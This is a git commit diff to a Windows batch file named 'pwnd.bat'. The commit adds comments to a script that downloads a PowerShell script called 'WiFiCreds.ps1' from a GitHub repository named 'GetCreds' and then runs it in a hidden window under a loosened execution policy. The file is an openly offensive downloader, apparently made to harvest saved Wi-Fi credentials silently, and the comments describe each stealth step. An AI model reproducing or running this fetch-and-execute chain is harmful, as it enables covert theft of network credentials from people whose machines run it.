822921e8da181c387336981da1bad2e6c5a5b8b6
Zmk55 <oreoboi@gmail.com>
2022-08-25 23:26:53 -0500

    Update pwnd.bat
    Added comments

--- pwnd.bat
+++ pwnd.bat
@@ -1,5 +1,6 @@
+::Runs Silently
 @echo off
-
+::Downloads PS Script
 powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Zmk55/GetCreds/main/WiFiCreds.ps1 -Outfil .\WifiCreds.ps1"
-
+::Executes PS script silently
 powershell -WindowStyle hidden  -executionpolicy remotesigned -File .\WifiCreds.ps1
